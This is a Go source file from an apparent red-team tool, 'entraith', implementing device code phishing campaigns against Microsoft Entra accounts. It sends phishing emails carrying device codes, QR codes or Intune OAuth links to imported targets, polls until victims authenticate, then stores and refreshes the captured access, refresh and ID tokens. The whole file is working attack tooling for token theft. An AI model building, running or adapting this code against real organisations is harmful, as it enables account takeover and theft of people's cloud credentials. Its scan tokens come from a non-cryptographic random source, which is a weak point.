package campaigns

import (
	"context"
	"encoding/base64"
	"fmt"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/bl4cksku11/entraith/internal/mailer"
	"github.com/bl4cksku11/entraith/internal/modules/devicecode"
	"github.com/bl4cksku11/entraith/internal/store"
	"github.com/bl4cksku11/entraith/internal/targets"
	qrcode "github.com/skip2/go-qrcode"
)

type CampaignStatus int

const (
	StatusDraft CampaignStatus = iota
	StatusRunning
	StatusPaused
	StatusCompleted
	StatusAborted
)

func (s CampaignStatus) String() string {
	switch s {
	case StatusDraft:
		return "draft"
	case StatusRunning:
		return "running"
	case StatusPaused:
		return "paused"
	case StatusCompleted:
		return "completed"
	case StatusAborted:
		return "aborted"
	default:
		return "unknown"
	}
}

// Campaign is a single device code phishing campaign.
type Campaign struct {
	mu          sync.RWMutex
	ID          string         `json:"id"`
	Name        string         `json:"name"`
	Description string         `json:"description"`
	Status      CampaignStatus `json:"status"`
	CreatedAt   time.Time      `json:"created_at"`
	StartedAt   *time.Time     `json:"started_at,omitempty"`
	CompletedAt *time.Time     `json:"completed_at,omitempty"`

	Targets  *targets.Store     `json:"-"`
	Engine   *devicecode.Engine `json:"-"`
	CancelFn context.CancelFunc `json:"-"`

	// notify is a buffered channel used to wake SSE subscribers immediately
	// when new sessions are created (e.g. from a QR scan confirm).
	notify chan struct{}

	ArtifactsPath string `json:"-"`
	ExportsPath   string `json:"-"`

	Results     []*devicecode.TokenResult
	ResultsByID map[string]*devicecode.TokenResult

	EmailResults []*mailer.EmailSendResult `json:"email_results,omitempty"`

	// QR phishing config — set when the operator sends QR emails.
	QRBaseURL      string `json:"qr_base_url,omitempty"`
	QRDCTemplateID string `json:"qr_dc_template_id,omitempty"`
	QRDCProfileID  string `json:"qr_dc_profile_id,omitempty"`
}

// NotifyCh returns the channel SSE handlers should select on for push updates.
func (c *Campaign) NotifyCh() <-chan struct{} { return c.notify }

// GetQRConfig safely returns the QR DC template and profile IDs under the read lock.
func (c *Campaign) GetQRConfig() (templateID, profileID string) {
	c.mu.RLock()
	defer c.mu.RUnlock()
	return c.QRDCTemplateID, c.QRDCProfileID
}

// GetStatus returns the campaign status string under the read lock.
func (c *Campaign) GetStatusStr() string {
	c.mu.RLock()
	defer c.mu.RUnlock()
	return c.Status.String()
}

// pushNotify sends a non-blocking signal on the notify channel so any SSE
// handler wakes up immediately and sends a fresh status update.
func (c *Campaign) pushNotify() {
	select {
	case c.notify <- struct{}{}:
	default:
	}
}

type Manager struct {
	mu        sync.RWMutex
	campaigns map[string]*Campaign

	tenantID string
	clientID string
	scope    string
	pollSec  int

	artifactsPath string
	exportsPath   string
	db            *store.Store
}

func NewManager(tenantID, clientID, scope string, pollSec int, artifactsPath, exportsPath string, db *store.Store) *Manager {
	return &Manager{
		campaigns:     make(map[string]*Campaign),
		tenantID:      tenantID,
		clientID:      clientID,
		scope:         scope,
		pollSec:       pollSec,
		artifactsPath: artifactsPath,
		exportsPath:   exportsPath,
		db:            db,
	}
}

// Load reads persisted campaign state from the database. Call once at startup.
func (m *Manager) Load() error {
	rows, err := m.db.LoadCampaigns()
	if err != nil {
		return fmt.Errorf("loading campaigns: %w", err)
	}

	m.mu.Lock()
	defer m.mu.Unlock()

	for _, row := range rows {
		targetRows, err := m.db.LoadTargets(row.ID)
		if err != nil {
			return fmt.Errorf("loading targets for %s: %w", row.ID, err)
		}
		tokenRows, err := m.db.LoadTokens(row.ID)
		if err != nil {
			return fmt.Errorf("loading tokens for %s: %w", row.ID, err)
		}
		emailRows, err := m.db.LoadEmailResults(row.ID)
		if err != nil {
			return fmt.Errorf("loading email results for %s: %w", row.ID, err)
		}

		tstore := targets.NewStore()
		for _, t := range targetRows {
			tstore.Add(&targets.Target{
				ID:          t.ID,
				Email:       t.Email,
				DisplayName: t.DisplayName,
				Department:  t.Department,
				Region:      t.Region,
				Group:       t.Group,
				CustomField: t.CustomField,
				ImportedAt:  t.ImportedAt,
			})
		}

		results := make([]*devicecode.TokenResult, 0, len(tokenRows))
		byID := make(map[string]*devicecode.TokenResult, len(tokenRows))
		for _, t := range tokenRows {
			r := &devicecode.TokenResult{
				AccessToken:       t.AccessToken,
				RefreshToken:      t.RefreshToken,
				IDToken:           t.IDToken,
				TokenType:         t.TokenType,
				ExpiresIn:         t.ExpiresIn,
				Scope:             t.Scope,
				TargetID:          t.TargetID,
				TargetEmail:       t.TargetEmail,
				RedeemedAt:        t.RedeemedAt,
				UserPrincipalName: t.UPN,
				TenantID:          t.TenantID,
				CapturedClientID:  t.CapturedClientID,
			}
			results = append(results, r)
			byID[r.TargetID] = r
		}

		emailResults := make([]*mailer.EmailSendResult, 0, len(emailRows))
		for _, e := range emailRows {
			emailResults = append(emailResults, &mailer.EmailSendResult{
				TargetID:    e.TargetID,
				TargetEmail: e.TargetEmail,
				SentAt:      e.SentAt,
				Success:     e.Success,
				Error:       e.Error,
			})
		}

		status := CampaignStatus(row.Status)
		// Polling goroutines are gone after a restart.
		if status == StatusRunning {
			status = StatusAborted
		}

		c := &Campaign{
			ID:             row.ID,
			Name:           row.Name,
			Description:    row.Description,
			Status:         status,
			CreatedAt:      row.CreatedAt,
			StartedAt:      row.StartedAt,
			CompletedAt:    row.CompletedAt,
			ArtifactsPath:  row.ArtifactsPath,
			ExportsPath:    row.ExportsPath,
			notify:         make(chan struct{}, 1),
			Targets:        tstore,
			Results:        results,
			ResultsByID:    byID,
			EmailResults:   emailResults,
			QRBaseURL:      row.QRBaseURL,
			QRDCTemplateID: row.QRDCTemplateID,
			QRDCProfileID:  row.QRDCProfileID,
		}
		m.campaigns[c.ID] = c
	}

	log.Printf("[store] loaded %d campaigns from database", len(rows))
	return nil
}

func (m *Manager) saveCampaign(c *Campaign) {
	c.mu.RLock()
	row := store.CampaignRow{
		ID:             c.ID,
		Name:           c.Name,
		Description:    c.Description,
		Status:         int(c.Status),
		CreatedAt:      c.CreatedAt,
		StartedAt:      c.StartedAt,
		CompletedAt:    c.CompletedAt,
		ArtifactsPath:  c.ArtifactsPath,
		ExportsPath:    c.ExportsPath,
		QRBaseURL:      c.QRBaseURL,
		QRDCTemplateID: c.QRDCTemplateID,
		QRDCProfileID:  c.QRDCProfileID,
	}
	c.mu.RUnlock()
	if err := m.db.UpsertCampaign(row); err != nil {
		log.Printf("[store] failed to save campaign %s: %v", c.ID, err)
	}
}

func (m *Manager) NewCampaign(id, name, description string) *Campaign {
	c := &Campaign{
		ID:            id,
		Name:          name,
		Description:   description,
		Status:        StatusDraft,
		CreatedAt:     time.Now().UTC(),
		Targets:       targets.NewStore(),
		notify:        make(chan struct{}, 1),
		ArtifactsPath: filepath.Join(m.artifactsPath, id),
		ExportsPath:   filepath.Join(m.exportsPath, id),
		Results:       make([]*devicecode.TokenResult, 0),
		ResultsByID:   make(map[string]*devicecode.TokenResult),
		EmailResults:  make([]*mailer.EmailSendResult, 0),
	}
	m.mu.Lock()
	m.campaigns[id] = c
	m.mu.Unlock()
	m.saveCampaign(c)
	return c
}

// NotifySSE wakes any SSE handler watching this campaign so it sends an
// immediate status update without waiting for the next ticker tick.
func (m *Manager) NotifySSE(campaignID string) {
	c, ok := m.GetCampaign(campaignID)
	if ok {
		c.pushNotify()
	}
}

func (m *Manager) GetCampaign(id string) (*Campaign, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	c, ok := m.campaigns[id]
	return c, ok
}

func (m *Manager) ClientID() string { return m.clientID }
func (m *Manager) TenantID() string { return m.tenantID }

func (m *Manager) AllCampaigns() []*Campaign {
	m.mu.RLock()
	defer m.mu.RUnlock()
	out := make([]*Campaign, 0, len(m.campaigns))
	for _, c := range m.campaigns {
		out = append(out, c)
	}
	return out
}

// DeleteCampaign removes a campaign and all its data from the database and memory.
func (m *Manager) DeleteCampaign(id string) error {
	c, ok := m.GetCampaign(id)
	if !ok {
		return fmt.Errorf("campaign not found")
	}

	// Stop any active polling
	c.mu.Lock()
	if c.CancelFn != nil {
		c.CancelFn()
	}
	c.mu.Unlock()

	if err := m.db.DeleteCampaign(id); err != nil {
		return fmt.Errorf("deleting from database: %w", err)
	}

	m.mu.Lock()
	delete(m.campaigns, id)
	m.mu.Unlock()
	return nil
}

// Launch starts the device code flow for all loaded targets in the campaign.
func (m *Manager) Launch(campaignID string) error {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return fmt.Errorf("campaign %s not found", campaignID)
	}

	c.mu.Lock()
	if c.Status == StatusRunning {
		c.mu.Unlock()
		return fmt.Errorf("campaign already running")
	}
	c.mu.Unlock()

	engine := devicecode.NewEngine(m.tenantID, m.clientID, m.scope, m.pollSec)
	ctx, cancel := context.WithCancel(context.Background())

	c.mu.Lock()
	c.Engine = engine
	c.CancelFn = cancel
	now := time.Now().UTC()
	c.StartedAt = &now
	c.Status = StatusRunning
	c.mu.Unlock()

	m.saveCampaign(c)

	os.MkdirAll(c.ArtifactsPath, 0700)

	allTargets := c.Targets.All()
	if len(allTargets) == 0 {
		cancel()
		c.mu.Lock()
		c.Status = StatusDraft
		c.StartedAt = nil
		c.CancelFn = nil
		c.Engine = nil
		c.mu.Unlock()
		m.saveCampaign(c)
		return fmt.Errorf("no targets loaded")
	}

	codes := make([]*devicecode.DeviceCodeResponse, 0, len(allTargets))
	for _, t := range allTargets {
		dcr, err := engine.RequestDeviceCode(ctx, t.ID, t.Email)
		if err != nil {
			fmt.Printf("[WARN] Failed to get device code for %s: %v\n", t.Email, err)
			continue
		}
		codes = append(codes, dcr)

		// Persist device code
		m.db.UpsertDeviceCode(store.DeviceCodeRow{
			DeviceCode:      dcr.DeviceCode,
			CampaignID:      campaignID,
			TargetID:        dcr.TargetID,
			TargetEmail:     dcr.TargetEmail,
			UserCode:        dcr.UserCode,
			VerificationURI: dcr.VerificationURI,
			ExpiresIn:       dcr.ExpiresIn,
			IntervalSec:     dcr.Interval,
			Message:         dcr.Message,
			IssuedAt:        dcr.IssuedAt,
			ExpiresAt:       dcr.ExpiresAt,
		})

		time.Sleep(time.Duration(800+rand.Intn(2200)) * time.Millisecond)
	}

	for _, code := range codes {
		engine.StartPolling(ctx, code.TargetID)
	}

	go m.collectResults(ctx, c)

	return nil
}

func (m *Manager) collectResults(ctx context.Context, c *Campaign) {
	for {
		select {
		case <-ctx.Done():
			return
		case result, ok := <-c.Engine.Results:
			if !ok {
				return
			}
			c.mu.Lock()
			c.Results = append(c.Results, result)
			c.ResultsByID[result.TargetID] = result
			c.mu.Unlock()

			// Persist token to database
			if err := m.db.InsertToken(store.TokenRow{
				CampaignID:       c.ID,
				TargetID:         result.TargetID,
				TargetEmail:      result.TargetEmail,
				AccessToken:      result.AccessToken,
				RefreshToken:     result.RefreshToken,
				IDToken:          result.IDToken,
				TokenType:        result.TokenType,
				ExpiresIn:        result.ExpiresIn,
				Scope:            result.Scope,
				UPN:              result.UserPrincipalName,
				RedeemedAt:       result.RedeemedAt,
				TenantID:         result.TenantID,
				CapturedClientID: result.CapturedClientID,
			}); err != nil {
				log.Printf("[store] failed to save token for %s: %v", result.TargetEmail, err)
			}

			m.saveCampaign(c)

			fmt.Printf("[+] TOKEN CAPTURED: target=%s upn=%s redeemed_at=%s\n",
				result.TargetEmail,
				result.UserPrincipalName,
				result.RedeemedAt.Format(time.RFC3339),
			)
		}
	}
}

func (m *Manager) Stop(campaignID string) error {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return fmt.Errorf("campaign not found")
	}
	c.mu.Lock()
	if c.CancelFn != nil {
		c.CancelFn()
	}
	now := time.Now().UTC()
	c.CompletedAt = &now
	c.Status = StatusAborted
	c.mu.Unlock()
	m.saveCampaign(c)
	return nil
}

func (m *Manager) GetStatus(campaignID string) (map[string]interface{}, error) {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return nil, fmt.Errorf("campaign not found")
	}

	c.mu.RLock()
	defer c.mu.RUnlock()

	sessions := map[string]interface{}{}
	if c.Engine != nil {
		for id, snap := range c.Engine.AllSessions() {
			sessions[id] = snap
		}
	}

	// Add QR-sent placeholder sessions for targets that have received a QR email
	// but haven't scanned yet (no real device code session exists for them).
	if qrScans, err := m.db.ListQRScans(c.ID); err == nil {
		seen := make(map[string]bool)
		for _, scan := range qrScans {
			if _, has := sessions[scan.TargetID]; has {
				continue
			}
			if seen[scan.TargetID] {
				continue
			}
			seen[scan.TargetID] = true
			sessions[scan.TargetID] = map[string]interface{}{
				"target_id":    scan.TargetID,
				"target_email": scan.TargetEmail,
				"state":        6,
				"state_str":    "qr_sent",
				"issued_at":    scan.CreatedAt,
				"user_code":    "",
			}
		}
	}

	return map[string]interface{}{
		"id":           c.ID,
		"name":         c.Name,
		"status":       c.Status.String(),
		"target_count": c.Targets.Count(),
		"token_count":  len(c.Results),
		"created_at":   c.CreatedAt,
		"started_at":   c.StartedAt,
		"completed_at": c.CompletedAt,
		"sessions":     sessions,
	}, nil
}

func (m *Manager) GetTokenByTargetID(campaignID, targetID string) (*devicecode.TokenResult, error) {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return nil, fmt.Errorf("campaign not found")
	}
	c.mu.RLock()
	t, ok := c.ResultsByID[targetID]
	c.mu.RUnlock()
	if ok {
		return t, nil
	}
	// Fall back to database (e.g. after server restart)
	row, err := m.db.LoadTokenByTargetID(campaignID, targetID)
	if err != nil {
		return nil, err
	}
	if row == nil {
		return nil, fmt.Errorf("no token for target %s", targetID)
	}
	return &devicecode.TokenResult{
		AccessToken:       row.AccessToken,
		RefreshToken:      row.RefreshToken,
		IDToken:           row.IDToken,
		TokenType:         row.TokenType,
		ExpiresIn:         row.ExpiresIn,
		Scope:             row.Scope,
		TargetID:          row.TargetID,
		TargetEmail:       row.TargetEmail,
		RedeemedAt:        row.RedeemedAt,
		UserPrincipalName: row.UPN,
		TenantID:          row.TenantID,
		CapturedClientID:  row.CapturedClientID,
	}, nil
}

// sanitizeRefreshScope removes /.default entries from a server-returned scope
// string. AAD returns the full granted scope list in token responses which can
// include both explicit scopes and a trailing /.default — sending that combined
// string back in a refresh request triggers AADSTS70011 invalid_scope.
func sanitizeRefreshScope(scope string) string {
	parts := strings.Fields(scope)
	clean := parts[:0]
	for _, p := range parts {
		if !strings.HasSuffix(p, "/.default") {
			clean = append(clean, p)
		}
	}
	if len(clean) == 0 {
		return scope // nothing to strip, return original
	}
	return strings.Join(clean, " ")
}

// RefreshToken exchanges the stored refresh_token for new tokens and persists the result.
func (m *Manager) RefreshToken(campaignID, targetID string) (*devicecode.TokenResult, error) {
	existing, err := m.GetTokenByTargetID(campaignID, targetID)
	if err != nil {
		return nil, err
	}
	if existing.RefreshToken == "" {
		return nil, fmt.Errorf("no refresh token available for target %s", targetID)
	}

	// Use the scope that was actually granted by the server (stored in the token),
	// falling back to the configured scope. Sending the config scope instead of
	// the originally-granted scope causes AADSTS70000 invalid_grant errors when
	// the two differ (e.g. config omits offline_access / openid).
	scope := sanitizeRefreshScope(existing.Scope)
	if scope == "" {
		scope = m.scope
	}

	refreshed, err := devicecode.RefreshAccessToken(context.Background(), m.tenantID, m.clientID, existing.RefreshToken, scope)
	if err != nil {
		return nil, err
	}

	refreshed.TargetID = existing.TargetID
	refreshed.TargetEmail = existing.TargetEmail
	refreshed.UserPrincipalName = existing.UserPrincipalName
	if refreshed.RefreshToken == "" {
		refreshed.RefreshToken = existing.RefreshToken
	}

	// Update in-memory cache
	c, ok := m.GetCampaign(campaignID)
	if ok {
		c.mu.Lock()
		c.ResultsByID[targetID] = refreshed
		for i, r := range c.Results {
			if r.TargetID == targetID {
				c.Results[i] = refreshed
				break
			}
		}
		c.mu.Unlock()
	}

	// Persist updated tokens
	if err := m.db.UpdateLatestToken(campaignID, targetID, refreshed.AccessToken, refreshed.RefreshToken, refreshed.RedeemedAt); err != nil {
		log.Printf("[store] failed to update token for %s: %v", targetID, err)
	}

	return refreshed, nil
}

func (m *Manager) GetTokens(campaignID string) ([]*devicecode.TokenResult, error) {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return nil, fmt.Errorf("campaign not found")
	}
	c.mu.RLock()
	defer c.mu.RUnlock()
	return c.Results, nil
}

// SendEmails dispatches phishing emails to all targets with active device code sessions.
func (m *Manager) SendEmails(campaignID string, profile *mailer.SenderProfile, tmpl *mailer.EmailTemplate) ([]*mailer.EmailSendResult, error) {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return nil, fmt.Errorf("campaign not found")
	}
	if c.Engine == nil {
		return nil, fmt.Errorf("campaign not launched — no device codes available yet")
	}

	sessions := c.Engine.AllSessions()
	if len(sessions) == 0 {
		return nil, fmt.Errorf("no active sessions to send emails to")
	}

	results := make([]*mailer.EmailSendResult, 0, len(sessions))
	for _, snap := range sessions {
		name := ""
		if t, ok := c.Targets.GetByID(snap.TargetID); ok {
			name = t.DisplayName
		}
		data := mailer.TemplateData{
			UserCode:    snap.UserCode,
			RealURL:     snap.VerificationURI,
			TargetEmail: snap.TargetEmail,
			TargetName:  name,
		}
		err := mailer.Send(profile, tmpl, data)
		res := &mailer.EmailSendResult{
			TargetID:    snap.TargetID,
			TargetEmail: snap.TargetEmail,
			SentAt:      time.Now().UTC(),
			Success:     err == nil,
		}
		if err != nil {
			res.Error = err.Error()
		}
		results = append(results, res)

		m.db.InsertEmailResult(store.EmailResultRow{
			CampaignID:  campaignID,
			TargetID:    res.TargetID,
			TargetEmail: res.TargetEmail,
			SentAt:      res.SentAt,
			Success:     res.Success,
			Error:       res.Error,
		})
	}

	c.mu.Lock()
	c.EmailResults = append(c.EmailResults, results...)
	c.mu.Unlock()
	m.saveCampaign(c)

	return results, nil
}

func (m *Manager) GetEmailResults(campaignID string) ([]*mailer.EmailSendResult, error) {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return nil, fmt.Errorf("campaign not found")
	}
	c.mu.RLock()
	defer c.mu.RUnlock()
	return c.EmailResults, nil
}

// SaveTargetToDB persists a newly added target to the database.
func (m *Manager) SaveTargetToDB(campaignID string, t *targets.Target) {
	if err := m.db.UpsertTarget(store.TargetRow{
		ID:          t.ID,
		CampaignID:  campaignID,
		Email:       t.Email,
		DisplayName: t.DisplayName,
		Department:  t.Department,
		Region:      t.Region,
		Group:       t.Group,
		CustomField: t.CustomField,
		ImportedAt:  t.ImportedAt,
	}); err != nil {
		log.Printf("[store] failed to save target %s: %v", t.Email, err)
	}
}

// ExportCampaign returns the full evidence package for a campaign.
func (m *Manager) ExportCampaign(campaignID string) (*store.CampaignExport, error) {
	if _, ok := m.GetCampaign(campaignID); !ok {
		return nil, fmt.Errorf("campaign not found")
	}
	return m.db.ExportCampaign(campaignID)
}

// DeleteTarget removes a target and all its associated data from both memory and DB.
func (m *Manager) DeleteTarget(campaignID, targetID string) error {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return fmt.Errorf("campaign not found")
	}

	c.Targets.Remove(targetID)

	c.mu.Lock()
	delete(c.ResultsByID, targetID)
	c.mu.Unlock()

	return m.db.DeleteTarget(campaignID, targetID)
}

// LaunchForTarget starts the device code flow for a single target in a running campaign.
func (m *Manager) LaunchForTarget(campaignID, targetID string) error {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return fmt.Errorf("campaign not found")
	}

	c.mu.RLock()
	status := c.Status
	engine := c.Engine
	cancelFn := c.CancelFn
	c.mu.RUnlock()

	if status != StatusRunning {
		return fmt.Errorf("campaign is not running")
	}
	if engine == nil {
		return fmt.Errorf("campaign engine not initialized")
	}

	t, ok := c.Targets.GetByID(targetID)
	if !ok {
		return fmt.Errorf("target not found")
	}

	ctx := context.Background()
	if cancelFn != nil {
		// Use a child context so cancelling doesn't kill just this target's polling
		_ = ctx
	}

	dcr, err := engine.RequestDeviceCode(ctx, t.ID, t.Email)
	if err != nil {
		return fmt.Errorf("requesting device code: %w", err)
	}

	m.db.UpsertDeviceCode(store.DeviceCodeRow{
		DeviceCode:      dcr.DeviceCode,
		CampaignID:      campaignID,
		TargetID:        dcr.TargetID,
		TargetEmail:     dcr.TargetEmail,
		UserCode:        dcr.UserCode,
		VerificationURI: dcr.VerificationURI,
		ExpiresIn:       dcr.ExpiresIn,
		IntervalSec:     dcr.Interval,
		Message:         dcr.Message,
		IssuedAt:        dcr.IssuedAt,
		ExpiresAt:       dcr.ExpiresAt,
	})

	engine.StartPolling(ctx, targetID)
	return nil
}

// RegenerateCode deletes the existing device code for a target and issues a new one.
func (m *Manager) RegenerateCode(campaignID, targetID string) error {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return fmt.Errorf("campaign not found")
	}

	c.mu.RLock()
	status := c.Status
	engine := c.Engine
	c.mu.RUnlock()

	if status != StatusRunning {
		return fmt.Errorf("campaign is not running")
	}
	if engine == nil {
		return fmt.Errorf("campaign engine not initialized")
	}

	t, ok := c.Targets.GetByID(targetID)
	if !ok {
		return fmt.Errorf("target not found")
	}

	if err := m.db.DeleteDeviceCodeForTarget(campaignID, targetID); err != nil {
		return fmt.Errorf("deleting existing device code: %w", err)
	}

	ctx := context.Background()
	dcr, err := engine.RequestDeviceCode(ctx, t.ID, t.Email)
	if err != nil {
		return fmt.Errorf("requesting new device code: %w", err)
	}

	m.db.UpsertDeviceCode(store.DeviceCodeRow{
		DeviceCode:      dcr.DeviceCode,
		CampaignID:      campaignID,
		TargetID:        dcr.TargetID,
		TargetEmail:     dcr.TargetEmail,
		UserCode:        dcr.UserCode,
		VerificationURI: dcr.VerificationURI,
		ExpiresIn:       dcr.ExpiresIn,
		IntervalSec:     dcr.Interval,
		Message:         dcr.Message,
		IssuedAt:        dcr.IssuedAt,
		ExpiresAt:       dcr.ExpiresAt,
	})

	engine.StartPolling(ctx, targetID)
	return nil
}

// SendEmailToTarget sends a phishing email to a single target's active session.
func (m *Manager) SendEmailToTarget(campaignID, targetID string, profile *mailer.SenderProfile, tmpl *mailer.EmailTemplate) (*mailer.EmailSendResult, error) {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return nil, fmt.Errorf("campaign not found")
	}
	if c.Engine == nil {
		return nil, fmt.Errorf("campaign not launched — no device codes available yet")
	}
	snap, ok := c.Engine.GetSession(targetID)
	if !ok {
		return nil, fmt.Errorf("no active session for target %s", targetID)
	}
	name := ""
	if t, ok := c.Targets.GetByID(targetID); ok {
		name = t.DisplayName
	}
	data := mailer.TemplateData{
		UserCode:    snap.UserCode,
		RealURL:     snap.VerificationURI,
		TargetEmail: snap.TargetEmail,
		TargetName:  name,
	}
	err := mailer.Send(profile, tmpl, data)
	res := &mailer.EmailSendResult{
		TargetID:    snap.TargetID,
		TargetEmail: snap.TargetEmail,
		SentAt:      time.Now().UTC(),
		Success:     err == nil,
	}
	if err != nil {
		res.Error = err.Error()
	}
	m.db.InsertEmailResult(store.EmailResultRow{
		CampaignID:  campaignID,
		TargetID:    res.TargetID,
		TargetEmail: res.TargetEmail,
		SentAt:      res.SentAt,
		Success:     res.Success,
		Error:       res.Error,
	})
	c.mu.Lock()
	c.EmailResults = append(c.EmailResults, res)
	c.mu.Unlock()
	return res, nil
}

// SetQRConfig stores QR phishing config on a campaign and persists it.
func (m *Manager) SetQRConfig(campaignID, baseURL, dcTemplateID, dcProfileID string) error {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return fmt.Errorf("campaign not found")
	}
	c.mu.Lock()
	c.QRBaseURL = baseURL
	c.QRDCTemplateID = dcTemplateID
	c.QRDCProfileID = dcProfileID
	c.mu.Unlock()
	m.saveCampaign(c)
	return nil
}

// SendQREmails generates a QR code per target and sends the QR phishing email.
// It also creates qr_scan tracking rows for each target.
// If filterTargetID is non-empty, only that specific target is emailed (selective send).
func (m *Manager) SendQREmails(campaignID string, profile *mailer.SenderProfile, qrTmpl *mailer.EmailTemplate, dcTemplateID, dcProfileID, baseURL, filterTargetID string) ([]*mailer.EmailSendResult, error) {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return nil, fmt.Errorf("campaign not found")
	}

	// Store QR config on campaign so the scan handler can find it later.
	c.mu.Lock()
	c.QRBaseURL = baseURL
	c.QRDCTemplateID = dcTemplateID
	c.QRDCProfileID = dcProfileID
	c.mu.Unlock()
	m.saveCampaign(c)

	allTargets := c.Targets.All()
	if len(allTargets) == 0 {
		return nil, fmt.Errorf("no targets in campaign")
	}
	// Selective send: filter to just one target if requested
	if filterTargetID != "" {
		filtered := allTargets[:0]
		for _, t := range allTargets {
			if t.ID == filterTargetID {
				filtered = append(filtered, t)
				break
			}
		}
		if len(filtered) == 0 {
			return nil, fmt.Errorf("target %s not found in campaign", filterTargetID)
		}
		allTargets = filtered
	}

	results := make([]*mailer.EmailSendResult, 0, len(allTargets))
	now := time.Now().UTC()

	for _, t := range allTargets {
		// Generate unique scan token (UUID-style using random bytes)
		token := newToken()
		scanURL := strings.TrimRight(baseURL, "/") + "/qr/" + token

		// Generate QR code PNG and embed as base64 data URL
		qrImgTag, err := makeQRImgTag(scanURL)
		if err != nil {
			log.Printf("[qr] failed to generate QR for %s: %v", t.Email, err)
			qrImgTag = ""
		}

		// Persist scan tracking row
		m.db.UpsertQRScan(store.QRScanRow{
			Token:       token,
			CampaignID:  campaignID,
			TargetID:    t.ID,
			TargetEmail: t.Email,
			CreatedAt:   now,
		})

		// Send QR email
		data := mailer.TemplateData{
			TargetEmail: t.Email,
			TargetName:  t.DisplayName,
			RealURL:     scanURL,
			QRCode:      qrImgTag,
		}
		err = mailer.Send(profile, qrTmpl, data)
		res := &mailer.EmailSendResult{
			TargetID:    t.ID,
			TargetEmail: t.Email,
			SentAt:      now,
			Success:     err == nil,
		}
		if err != nil {
			res.Error = err.Error()
		}
		m.db.InsertEmailResult(store.EmailResultRow{
			CampaignID:  campaignID,
			TargetID:    res.TargetID,
			TargetEmail: res.TargetEmail,
			SentAt:      res.SentAt,
			Success:     res.Success,
			Error:       res.Error,
		})
		results = append(results, res)
	}

	c.mu.Lock()
	c.EmailResults = append(c.EmailResults, results...)
	c.mu.Unlock()
	m.saveCampaign(c)
	return results, nil
}

// makeQRImgTag generates a QR code PNG for url and returns an HTML <img> tag
// with the image embedded as a base64 data URL.
func makeQRImgTag(url string) (string, error) {
	png, err := qrcode.Encode(url, qrcode.Medium, 256)
	if err != nil {
		return "", err
	}
	b64 := base64.StdEncoding.EncodeToString(png)
	return `<img src="data:image/png;base64,` + b64 + `" alt="Scan QR code" style="width:220px;height:220px;display:block">`, nil
}

// newToken returns a random 32-hex-char token.
func newToken() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

// IntuneOAuthURL is the Microsoft OAuth authorization URL for Intune device registration.
// This URL triggers the AAD Broker redirect which we capture for token acquisition.
const IntuneOAuthURL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9ba1a5c7-f17a-4de9-a1f1-6178c8d51223&redirect_uri=ms-appx-web%3A%2F%2FMicrosoft.AAD.BrokerPlugin%2FS-1-15-2-2666988183-1750391847-2906264630-3525785777-2857982319-3063633125-1907478113&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default"

// SendIntuneEmails sends phishing emails with Intune OAuth links.
// Each target gets a unique token that tracks when they visit the landing page.
func (m *Manager) SendIntuneEmails(campaignID string, profile *mailer.SenderProfile, intuneTmpl *mailer.EmailTemplate, baseURL, filterTargetID string) ([]*mailer.EmailSendResult, error) {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return nil, fmt.Errorf("campaign not found")
	}

	allTargets := c.Targets.All()
	if len(allTargets) == 0 {
		return nil, fmt.Errorf("no targets in campaign")
	}

	if filterTargetID != "" {
		filtered := allTargets[:0]
		for _, t := range allTargets {
			if t.ID == filterTargetID {
				filtered = append(filtered, t)
				break
			}
		}
		if len(filtered) == 0 {
			return nil, fmt.Errorf("target %s not found in campaign", filterTargetID)
		}
		allTargets = filtered
	}

	results := make([]*mailer.EmailSendResult, 0, len(allTargets))
	now := time.Now().UTC()

	for _, t := range allTargets {
		token := newToken()
		intuneURL := strings.TrimRight(baseURL, "/") + "/intune/" + token

		m.db.UpsertIntuneToken(store.IntuneTokenRow{
			Token:       token,
			CampaignID:  campaignID,
			TargetID:    t.ID,
			TargetEmail: t.Email,
			CreatedAt:   now,
		})

		data := mailer.TemplateData{
			TargetEmail: t.Email,
			TargetName:  t.DisplayName,
			RealURL:     intuneURL,
		}
		err := mailer.Send(profile, intuneTmpl, data)
		res := &mailer.EmailSendResult{
			TargetID:    t.ID,
			TargetEmail: t.Email,
			SentAt:      now,
			Success:     err == nil,
		}
		if err != nil {
			res.Error = err.Error()
		}
		m.db.InsertEmailResult(store.EmailResultRow{
			CampaignID:  campaignID,
			TargetID:    res.TargetID,
			TargetEmail: res.TargetEmail,
			SentAt:      res.SentAt,
			Success:     res.Success,
			Error:       res.Error,
		})
		results = append(results, res)
	}

	c.mu.Lock()
	c.EmailResults = append(c.EmailResults, results...)
	c.mu.Unlock()
	m.saveCampaign(c)
	return results, nil
}
